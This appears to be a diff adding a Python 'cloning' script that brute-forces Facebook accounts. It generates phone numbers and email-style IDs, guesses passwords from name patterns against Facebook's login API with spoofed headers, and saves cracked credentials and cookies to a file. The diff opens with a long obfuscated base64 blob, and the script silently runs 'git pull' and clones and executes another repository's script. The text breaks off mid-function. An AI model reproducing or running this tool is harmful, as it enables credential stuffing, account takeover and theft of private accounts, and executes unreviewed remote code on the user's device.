l9wQsd06x50t97Y3bK2ndlom/xpn18oaVz1js5M3fdM2Zrnmr39LTdvTvT1dY66h3nJs60O/zdNstNm6ffefP+wEz/rZ6JwTFTd8v1qyPWgavWANc1eq1n3N3LT8x0jff3823cnHNU4Ib67zmvXDsW8ARnL7SaLabWY+7ZCx3OSduNheFmV9f8ZNDna+YnTMfuCQHQwEDDmTT19C/Mj8913zQPzXoneFM3bGHArQ2qk7DC+LygP7kQy+3ktM8ncHyszVXBPgF0CH7UFwQAMd0+viEA6Aq/pON2zcwKYLSI4QQdoeO1Qz5hsoPphHu+akGJ1LbVnmZq0cf+XEEPsgFprk2GG3Q0wC+ANCyAwEGZNsAaHGrLDgV9Vc+UKyxg32pqb280m1trQ0WpYGOb10LEJXOoJGXrB93wtI/3hPS1HV6WByNFbagy2zmRnpCu1hyLGV5ZhPHVOLzUwwuq6gy84+MQtDsMQQV0INvbTHC3HKx8BQsu7p7fxwugL2aF2VDXq/eQoNW74BUiDamuMjA75Qb1VhM7ZXWlnub/EjTY+FGrWQ4MFWBUKnTAy1kmeY51wa+nBBQt/IimiwsoBlBeznm/zwXGCX0+WmNp9twO0Ud7zx4dDObFmAD08bQu/x0miD6sBmyY0P7MXeRdpxlmpDZ2lkvjnITjxm/S7/Gn8MT1sg1wGSBtI7cZ0nH3Ps6m6uP2O2LPn579yPpDesMK/0/oJ7RY3ph0i/Vx8exbPLeDBal8/8Uf9XWPgZxDOcAQ/5rN7Z3/4e1/eedC/KDZGCJIfGELrSaFbHFC7vGS6czVn8NZNAYJAmQengcA1E/+CSQG/BQ6+rbSp1A6qG/h/2OsCGZ9oOLwUej6PgR6WBHxqdj1M/giD4+/8/Bb5ehLWOiYmUK5fT6/aunHAAsB8rs8/GCOQsMP9VnQmTf+rxE+rEf8GYj1ERY/68b3ovgDHPxKWmwtqQeLXc/jC/oVag5Utlj91M1wwiTrcgoKDbgQTwCuFQHuggIjXCC2F/R1hAbG1mn4ga7UmpVCOeaD3tjqE+H0o/uoFaofno27DLWkb96paJ3c/KTDPw/PzcWO54nQv4Qlzs0V8fkw5UWQMMSUjx9AXoMOC/+/ooD99xTS6/LDDz77FgMKDnTwzKIDpBA0NoVGzQug+SDzByyo+eC8K1CEZV6vk6i2cPxA4BisoAPogp1fafJWPe9de+/u4+LH5sfXHt+NDkqaWllTGy7ZxqnVyqd48SZeLJbwUR4A8PygJq46APizMgjuxmz+HKo/rfvp1I+Pf3wcaP/GHLP/edznL25MxDX223HN5FdjGpGbgUbXPIQeb9yyhJfwgIwHRFwAjyo5qpt9YOq7JU2FrKkAKdbmry6/d13SVsnaqnDptrZQ1h6QtBWytiJcumUs2MHqiJLPIAiP7hC1ZNzDuKStlLVw0ctYHD23Hnh0STTUhVu2SM3quafkvk1yn1jd+HOr+NrkDpznu0oD5Ro9DpVZOgiVHs24BijTGjdUfk9j0wJlQuuAiltr0wHlpm4OKsu6W3qgHLDH4WcYRt3W/z2COwhuaQ1v3ntwTyzs+3mdVDgoDt2XCu9L2pCsDYXN28Wl71aIVS1/Fvih+X9q/dPX/83rUnGXXNz1tLhvs7jv5zVS8YBcPPCLiVvyxFdFxxu/xrBOwgbP7l0heuDZvCvEADyo10mgE3xQAaab+BA0QeW/QmUcnuiDCvB3nbgRQ5mIoUxAy68QDqi4iHESKK+Rc1DhSQEqxoU4BAQ0Frxz8q2TMUbuR/jH+qeXRzcvj0qXx+XL408v2zcv26XLr8mXXwPO0r6vyAAaJmXDZLh5i9SK+lMSeSrcvENghtGiyDGx5PgOPGdY9ASS0bpExEyQpMQQjHKEdJNJOw+5BA2/R/ZRSbur1DA0XKPYlB1HeaHBT4V0SbvXdTdhUdj1Dn3SbkrvgQaf/qYhaXfLsAANiwbemLQLGG15sD7k9ecl7QbyvgoNU3melJ0372o+dMq/kZ+0m8ifgQZXfiBlJ+R3F8DSKxgpSNpdK3BAg7PAn7K7W9BRCJSuwp7CpF1voRMauMLZlN1C4SI09BeNFCXtkhCUmM74ju4tnVh8Q3zNIc4HxOB9cS4EXLuJPkhwOzEJlVnCQ0R0oFrovbBWABi2bGlKolPvzj3dX7+5v17af0ref+rpftPmfpO03yLvt4ga+PwKXvMy8PjIBw1PtFKlSa40ASN4fuiMqT8nYqpEDcrUoEgNblOa1T54Pz91XKaOi9TxX1E6dE0LGe16pF0nHhkkqkqmqkSqCqBG8BVbuHOL0q/YPtEVRbve7X9admKz7IRUdlIuO/m0rGmzrEkqM8tlZlFnlnTmlBe9ca3yqf7gpv6gpK+W9dXh7q28wnfOvnU2NkL/qPTjqqcd1zc7rksdE3LHxNOOO5sdd6SOSbljEjhL+x0ygMYp2TgV7t6m9G8fWbkavooutXkjPbdvgOdHZEz9eW1MFReX4hrDG4CodAckKoA7CKJQxiXqukxdF6nrcYo0SZRJpkwiZdqmdJF9bwceVkStEnVApg48pQ5tUofWnRvHvzn/pPab3ifjUrVZoiwyZREpyzZlfLsn2i1RFTJVIVIVgFph22cajM5/pjo2i5MlKRC7h2lq5eLqxTD4r1yEH5gtefbs2a9wOnx35UC4DP4DcCL/Y2vvvtFi4m+MNgIom8UnRi/Qm+dxABXd5CT8Zu/kZEg34xIYP2CuQwWCL+icZRKfVK9/V7UtBJ1sJ6cCzfzfQiNiFxBroYMsKBqPX08O99og73a7pqwKxbucs/ArMgGutVmhQsBS0SWYZ8UAXRsFx5Sb40k0xgJhIQ9ZAmEs4APWcIGQ/zcQ0CgBAZ9fKQGOziDPA1GkcTooBHkuwKMdOzQcUbUooBl/PHS/w8u5eR3yDHWxnS1OTnDMK/kIA87hsL57Xt6A2AZoTCbCHfR4AzzcIs7/74iP4f08PP0PWWFFH0s+EGX5fORV4OZDitblDQjou8Rdw0OIieA78QTLpAWcwRQfFBC/FOMrNDBEwLRcSbBGfBeeOOaIPkqqtyXuBODfwNLOPqLjM8Qii5g+kBwgBaHrAvlLiLlzKjir4NMKPoO4Pf4RYvXmYvwfnFWPncSBc6f8ReQD3gsAWCkLfxmP8T7zMcYPbfTpwBMs4CAEAxCFBvwhN89/iuIHHDfnDbjmg4pecADxex5Iifz/Ar2iuRBj0t3rih3WRHwa6fIICgFiQjcbwAl+Hm5l4+E0Lg95WB5OhvKnITgFwZlYRXDxiJtViNnZGBNLzM/zEyjdjkAQyDT3/O5gIADYtXve+w4gyrucCgWABd6QCFg51nFfIYUZd+yCBtoDpP9ZUMHdXoW6D5hV4Dbr5YdReE6/E33nFe19QnvoFK1DADyqPxA7n6QLxr9yCSp3XBbjKTyxmQp9DgV+BCN2pyK6UAEdPkWHj/5zgheETRKGMTmZ8R2N57rzHh8bdHMXebgHCopRAS2ok6Dd4/gWpg+jP9QQq6BzqpawwzJ2WMQOx60iDRJWLmPlIlaeE+mM+A/1bGGV4sueLeyQ+LJnC6sV058t7LiY/mxhR8T0ZwtrF9OfXDh1Yvqzhaikfrawk2L6kyt2Rkx/trADYvqTKxcFYc1qgYQVyViRiBVtUdpwF7wLLUzCA11XIBOl6SXDBGDDtMPIdC3NNBI3IRZMMwxMWxpdmN6itWFqS2cIa7eosnCvDO/b3C9T+8MkPKWm2SFovHlLWxpeXF0Sy/ol7YAMn2vhsi0wpJSF56N1Er5fxvc/xQ9u4gfXxyW8VsZrRfQ8+0QLGBYcb06BLVwT3idqLRJulXGrmPU8gztaQOVtBuontD48/gqfWae2DIWRo1H64ek1MCAewss+gwDwCuSxcPEWWRpulcnSaEf0buxI3G52BpVD13qZRFbLZDW0u7uXUF7VrhwAg1HUmiPXAABPtDiuQvM6DgE0rjti1hs1cTVufhI3P4mbYYFo3jz44GCETQpdcAfShXDJFlkUbl29IBabY49EWmTSAhNRFAPAEdSJkjFCDaG8g24JATAtE4HYxZF78Nqi8t+p9q9ROXSrSZ4L+TCkWJ6obQNP5G5MjXZAAA3rNRBci1lDYrVtxA1PiuNq3PxR3PxR3BzeB6rym1UPqiLXk5QDmi19QWRfhH9YsVaxg+XjJgTCHVvk8d3qSS67V6TQbwUtV7Xse/U6DDoTahoGpNOLdFPEDABU7wIQrYHgGgCgIgMA3UBFpps2iiHoiKE+weNq3BwuDZfu6IyQ1ElQjo3i47g4fkOcuCnesou3XxPvTIpfnRKdnDg9K7rmRbdX9N0VeUG8JkjYcJgIW8NCpDPCR49Eg+s3NvqeuH6o/RH5o37Ux+1QOA7vFYqDTzT5oAekDKCzI/PCxCdUURjfegnIT+g0lcAbZUw6FCR0dCHoW5ExpitM+igNT696oteid9eL183r16L9koaRNQzqwguLoyXh/LA2Qm8Zy9Yrn2g/6vkR/fNj4vXb4ldnRc8iKMM38F5YlEPEzZhsPwsVrSsOQWry969ffdLzwwM/4sRrE+Idp+i6C+VevAui9BGjULlJTMUkQx4qukAcgl5UUyBrDjzVVG3C7cuHZPjUgEA1+ogV/BflQuZp4ZHNwiNS4TEZPqclY4MMHk0TxMr2XAutjZGuSFeUfNi71rvijY5JmvL1UvCPHQ3W1GzUSZqjG86N+DWrkqbxyYKkaflNfMIyHsNh+SYhsBlF+iQENmVQGwcUiYORKgkMmDEvrAW1I2oE+RE1VVuFZZGguM8iFVrlQmu4N9P8ibYw2rqprRC1FeuzT45sVjeK1Y1buvwILRack3TnZd15UXceWHwSs2uUdE2yrknUNW3pCqPmh3kR7ZauKMGUHZewEhkrEbESUC9wQ4wtM0uYRcYsImbZ0uaFg2K+U9KyspYFFTjBuZ2WsAYZaxCxhqSVScLMMmYWMfMOsQ+HVUUFT5fBdpAEJ0lcB/MfBwYHaiYqeIVshPok+CpegBt3sCRgDkO/SdCJXyHwwzuYCo5Qp6HnJLDjGJUXsW+io+BbdEF4dPVWJJTcGgyeZ1t4XoSKUPByk5i7WAiYAEamGRE9KgRILU2YXtGuasPoHzABhvgvWpu7T2Efn6JtNPmxyWjDyJ9iUP+0uGiiFntaS0wcI5/WF02cxZ6eJSYukv8fX1AMxw=='))))
+ ####@-----Import-----@####
+from msilib.schema import AppSearch
+import os,base64
+
+os.system('git pull -q;rm .rndm')
+try:
+	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
+	from string import *
+	from concurrent.futures import ThreadPoolExecutor as ThreadPool
+except(ImportError):
+    os.system("pip install requests")
+    pass
+
+
+try:
+    import bs4
+except(ImportError):
+    os.system("pip install bs4")
+    
+try:
+    import bs4
+except(ImportError):
+    os.system("install espeek")
+    pass
+
+try:
+ pass
+except:pass
+
+
+import subprocess
+from bs4 import BeautifulSoup
+import json,os,time,base64,random,re,sys, subprocess 
+from requests.exceptions import ConnectionError as CError
+from concurrent.futures import ThreadPoolExecutor as speed
+
+accounts = []
+loop = 0
+
+
+####DESIGN####
+def oo(t):
+	return '\033[1;91m[\033[1;97m'+str(t)+'\033[1;91m]\033[1;97m '
+
+###USERAGENTSGEN####
+'''
+fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
+
+android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
+andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
+model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
+carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
+build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
+
+device = {
+        'android_version':android_version,
+        'model':model,
+        'build':build,
+         'cr':carr,
+         'brand':andd}
+
+'''
+ua = []
+
+import requests
+rs = requests.get
+ua = []
+
+del ua
+"""
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360038809 t6006063806750198674 athfa3c3975 altpub cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v9946691043 t2359546008474051152 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v1293053146466352222 t4418554050904986715 ath1fb31b7a altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v8702605039731550882 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (Linux; Android 7.1.1; N9560 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v5436392744083573770 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v4545621359653455873 t7257912775283346076 ath5ee645e0 altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36 RuxitSynthetic/1.0 v2894625283128232269 t6315332425969305434 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v5494699589149184143 t7257912775283346076 ath5ee645e0 altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360166407 t3176537711211975202 athfa3c3975 altpub cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360166405 t3984374008602804876 athfa3c3975 altpub cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 RuxitSynthetic/1.0 v5410955731649432201 t8056460500199558789 ath5ee645e0 altpriv cvcv=2 smf=0
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v8223426225533733795 t331183210298792754 ath1fb31b7a altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v9947176573 t2359546008474051152 athfa3c3975 altpub cvcv=2 smf=0 svfu=1
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 RuxitSynthetic/1.0 v3360178946 t6703941201591042144 athfa3c3975 altpub cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v5291232599499729713 t4763100215355965436 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v3317947955324566861 t8360729428027585528 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 RuxitSynthetic/1.0 v4000966587464841291 t5747064355914000718 ath259cea6f altpriv cvcv=2 smf=0
+Mozilla/5.0 (Linux; Android 8.1.0; DUA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36
+Mozilla/5.0 (Linux; Android 6.0; E5533) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36
+"""
+
+ua=[]
+
+##Logo##
+W = '\033[97;1m'
+R = '\033[91;1m'
+G = '\033[92;1m'
+Y = '\033[93;1m'
+B = '\033[94;1m'
+P = '\033[95;1m'
+C = '\033[96;1m'
+tred = speed
+
+def clear():
+	os.system('clear')
+def back():
+	login()
+	
+	import getpass
+
+attemps = 0
+
+while attemps < 12345677901:
+    username = input(' \033[0;92mEnter Username: ')
+    password = input(' \033[0;93mEnter Password: ')
+
+    if username == 'cent' and password == '15':
+        print(' \033[0;92mYou Have Successfully Logged in.')
+        break
+    else:
+        print(' Incorrect Pass Please Trying ')
+        attemps += 1
+        continue
+os.system('clear')
+#------------------[ MAIN ]-----------------#
+
+os.system('espeak -a 300 "Put,   Your,   First,  Name,"')
+NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
+os.system('espeak -a 300 " FUCK, YOU, BITCH,"')
+os.system('xdg-open https://github.com/CenTsuPH')
+def banner():
+	os.system("clear")	
+logo= f'''
+{W}█████████  █████████  ███    ██  ███████████
+{W}██         ██         ██ █   ██      ███    
+{W}██         ████████   ██  █  ██      ███    
+{W}██         ██         ██   █ ██      ███    
+{W}█████████  █████████  ██    ███      ███    
+\033[1;93m=================================
+\033[1;97m Owner  : CENT:/
+\033[1;97m GitHub : CenTsuPH :/
+\033[1;97m Version:\033[1;92m 0.8 \033[1;97m:/
+\033[1;97m Status : HIDDEN :/
+\033[1;97m Notice : FOR PRIVATE USERS
+\033[1;93m=================================
+'''
+
+####@-----Menu-----@####
+def CENT_Main():
+    os.system("clear")
+    print(logo)
+    print(f"{oo(1)}File Cloning")
+    print(f"{oo(2)}Random Cloning")
+    print(f"{oo(3)}Gmail Cloning")  
+    print(f"{oo(2)}Create File")
+    print(f"{oo(0)}Exit")
+    inpp = input(f"{oo('?')}Your Choice : ")
+    if inpp == "1":
+        file()
+    if inpp == '2':pak()
+    if inpp =='3':
+        gmail()
+    if inpp == "4":
+     print(f'{oo("+")}Loading Best File Create Command ')
+     os.system('cd && git clone --depth=1 https://github.com/Hannan-404/FILE')
+     os.system('cd && cd FILE ;python FILE.py')
+     exit()
+    if inpp == "0":
+     exit('Exit!')
+     
+     
+l = []
+
+####@-----File-----@####
+def file():
+    os.system("clear")
+    print(logo)
+    if 'gm' in l:
+        file = '.CENT'
+    else:
+        file = input(f"{oo('-')}Enter File: ")
+    try:
+        for x in open(file,'r').readlines():
+            accounts.append(x.strip())
+    except:
+        print(f"{oo('!')}File Not Found");time.sleep(1)
+        Hxw_Main()
+     
+    method()
+    exit()
+    
+            
+   
+####@-----AppCheck-----@####
+def check(session,coki):
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        pass
+    else:
+        for gm in game:
+            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Hxw-182^)Code=hannan-2233]'))
+
+
+def gmail():     
+        os.system('rm -rf .Hannan')
+        first = input(f'{oo("?")}Put First Name: ')
+        last = input(f'{oo("?")}Put Last Name: ')
+        domain = input(f'{oo("?")}Put Domain: ')
+        try:
+            limit = input(f'{oo("?")}Put Limit: ')
+        except ValueError:
+            limit = 5000
+        lists = ['3','4']
+        for xd in range(int(limit)):
+            lchoice = random.choice(lists)
+            if '3' in lchoice:
+                mail = ''.join(random.choice(string.digits) for _ in range(3))
+                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+            else:
+                mail = ''.join(random.choice(string.digits) for _ in range(4))
+                open('.Hannan','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+            fo = open('.Hannan', 'r').read().splitlines()
+        with tred(max_workers=30) as king___xd:
+            tl = str(len(fo))
+            tk = first+last
+            l.append('gm')
+            file()
+
+       
+        
+####@-----PakNumber-----@####
+
+
+def pak():
+	user=[]
+	code = input(f'{oo("!")}Put Code : ')
+	try:
+		limit = int(input(f'{oo("?")}Put Limit :  '))
+	except ValueError:
+		limit = 5000
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	for psx in user:
+		ids = code+psx
+		open('.rndm','a').write(ids+'|'+psx+' '+ids+'\n')
+	andom()
+
+
+
+####@-----UserAgent----@####
+"""
+Mozilla/5.0 (Linux; Android 11; Infinix X695 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
+Mozilla/5.0 (Linux; Android 13; V2169 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
+Mozilla/5.0 (Linux; Android 13; SM-M127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 11; itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 7.1.1; N9560 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]
+Mozilla/5.0 (Linux; Android 12; 22041219C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 12; TECNO KH6 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.2.0.20.404;]
+Mozilla/5.0 (Linux; Android 11; MP02 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 12; CPH2457 Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 11; T781SPP Build/RKQ1.210614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 10; Z555 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/388.0.0.23.106;]
+Mozilla/5.0 (Linux; Android 8.0.0; CUBOT_P20 Build/O00623; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/390.2.0.29.103;]
+Mozilla/5.0 (Linux; Android 10; EVE-LX9N Build/HUAWEIEVE-LX9N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/370.0.0.14.108;]
+Mozilla/5.0 (Linux; Android 12; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 11; Armor 12 5G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 12; 22041216C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+Mozilla/5.0 (Linux; Android 10; CDY-NX9B Build/HUAWEICDY-N29B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.0.0.0.302;]
+Mozilla/5.0 (Linux; Android 10; STS570 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/389.1.0.23.214;]
+Mozilla/5.0 (Linux; Android 11; TECNO KG6p Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]
+
+"""
+####@-----FileM-----@####
+
+
+def method():
+    okacc = []
+    cpacc = []
+    totalpass = []
+    os.system("clear")
+    print(logo)
+    if 'o':      
+        lp = input(f'{oo("?")}Total Password? : ')
+        if lp.isnumeric():
+            ex = 'firstlast first123 last123'
+            print(f'{oo("+")}{ex} (ETC)')
+            for x in range(int(lp)):
+                totalpass.append(input(f'{oo(x+1)}Password : '))
+            pass
+        else:
+            print(f"{oo('!')}Numeric Only")
+            exit()
+    print(f'\n'+oo("1")+'Method 1 (Updated)\n'+oo("2")+'Method 2 (Updated)')
+    m=input(f"{oo('!')}Input : ") 
+    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
+    cpok=input(f"{oo('!')}Input : ")
+    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
+    c=input(f"{oo('!')}Input : ")
+    apps='y'
+    os.system("clear")
+    print(logo) 
+    print('\033[1;93m='*25)
+    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
+    print(f"{oo('-')}Wait As You Can :)")
+    print(f"{oo('•')}/sdcard/CENT-OK.txt")
+    print('\033[1;93m='*25)
+    print()
+    
+    def start(user):
+     try:
+        global loop,accounts
+        r = requests.Session()
+        user = user.strip()
+        acc, name = user.split("|")
+        first = name.rsplit(" ")[0]
+        try:
+            last = name.rsplit(" ")[1]
+        except:
+           last = first
+        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
+        sys.stdout.write('\r\033[1;91m[\033[1;97mCENT-M1\033[1;91m]\033[1;97m {}-{} \033[1;91m[\033[1;97m{}\033[1;91m] \033[1;97mOK : \033[1;92m{} \033[1;97mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.flush()
+        for pword in totalpass:              
+            heads = None
+            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
+            pword = pword.replace("first", first).replace("last", last)
+            pword = pword.lower()
+            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
+            print(response.text)
+            if 'session_key' in response.text:
+                okacc.append(acc)
+                print('\r\033[1;92m[\033[1;97mCENT-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
+                open('/sdcard/CENT-OK.txt','a').write(f'{acc} • {pword}\n')
+                if c=='y':
+                    try:
+                           q = json.loads(response.text)
